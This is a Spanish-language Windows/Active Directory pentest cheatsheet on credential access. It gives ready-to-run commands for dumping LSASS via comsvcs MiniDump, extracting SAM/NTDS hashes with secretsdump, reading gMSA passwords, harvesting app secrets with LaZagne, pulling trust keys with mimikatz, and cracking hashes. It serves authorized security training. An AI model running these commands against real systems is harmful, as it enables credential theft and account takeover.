# Acceso a Credenciales

[⬅ Volver al índice](../CHEATSHEET.md) · [Versión web](https://iphobiuss.github.io)

> [!WARNING]
> **Solo entornos autorizados.** Contenido educativo y de referencia, con placeholders genéricos (`corp.local`, `$DC_IP`). No reproduce hosts, flags ni cadenas de ningún examen. Aplicar estas técnicas sin permiso por escrito es ilegal.

## Teoría

En una red Windows, las credenciales son el objetivo real: con el hash o el ticket correcto no hace falta "hackear" nada más, simplemente te autenticas. Por eso buena parte del post-explotación consiste en **cosechar secretos y reutilizarlos** (pass-the-hash, pass-the-ticket).

Los secretos viven en varios sitios: en **memoria** (LSASS, mientras hay sesiones activas), en el **registro local** (SAM para cuentas locales, LSA secrets), en la **base del dominio** (NTDS.dit en el DC), cifrados por **DPAPI** (credenciales guardadas por apps y el SO), y en **texto claro** dentro de scripts, configs y notas. El crackeo se hace **offline**: se extrae el hash y se ataca con diccionario o fuerza bruta sin generar ruido en la red.

## Herramientas del área

### hashcat

**Qué hace** · Crackeador de hashes acelerado por GPU; soporta cientos de formatos.  

**Cuándo se usa** · Romper hashes de Kerberoasting (13100), NetNTLMv2 (5600), AS-REP (18200), NTLM.

```bash
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
```
📖 [Documentación](https://hashcat.net/wiki/doku.php?id=example_hashes)

### john

**Qué hace** · John the Ripper: crackeo versátil, ideal para formatos con *2john.  

**Cuándo se usa** · Claves SSH, Ansible Vault, ZIP y hashes que hashcat no cubre cómodo.

```bash
ssh2john id_rsa > k.hash && john k.hash --wordlist=rockyou.txt
```
📖 [Documentación](https://github.com/openwall/john)

### pypykatz

**Qué hace** · Reimplementación en Python de mimikatz para parsear dumps offline.  

**Cuándo se usa** · Extraer credenciales de un minidump de LSASS sin ejecutar nada en el host.

```bash
pypykatz lsa minidump lsass.dmp
```
📖 [Documentación](https://github.com/skelsec/pypykatz)

### secretsdump

**Qué hace** · Vuelca hashes de SAM/LSA/NTDS local o remotamente (parte de Impacket).  

**Cuándo se usa** · Tras leer las hives (SeBackup) o al hacer DCSync contra el DC.

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
📖 [Documentación](https://github.com/fortra/impacket)

### gMSADumper

**Qué hace** · Recupera la contraseña de cuentas gMSA a las que tienes acceso de lectura.  

**Cuándo se usa** · Cuando controlas un principal autorizado a leer una gMSA privilegiada.

```bash
python3 gMSADumper.py -u $USER -p $PASS -d $DOMAIN -l $DC_IP
```
📖 [Documentación](https://github.com/micahvandeusen/gMSADumper)

### LaZagne

**Qué hace** · Cosecha credenciales guardadas por apps locales (navegadores, chats).  

**Cuándo se usa** · En un host comprometido, para recolectar accesos a otros sistemas.

```bash
LaZagne.exe all
```
📖 [Documentación](https://github.com/AlessandroZ/LaZagne)

## Comandos por objetivo

### Acceso a credenciales

```bash
# SAM/SYSTEM con SeBackupPrivilege → parseo offline
reg save HKLM\SAM SAM && reg save HKLM\SYSTEM SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# LSASS con LOLBin comsvcs + parseo offline
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <pid> lsass.dmp full
pypykatz lsa minidump lsass.dmp
# DPAPI (credenciales guardadas)
nxc smb $TARGET -u Administrator -H <HASH> --local-auth --dpapi
# SecureString exportado bajo Constrained Language Mode (PowerShell)
$sec = ConvertTo-SecureString -String $b64
(New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER',$sec)).GetNetworkCredential().Password
# gMSA
python3 gMSADumper.py -u $USER -p $PASS -d $DOMAIN -l $DC_IP
# secretos locales de apps de escritorio
LaZagne.exe all
# trust keys inter-forest
mimikatz "privilege::debug" "lsadump::trust /patch" "exit"
```
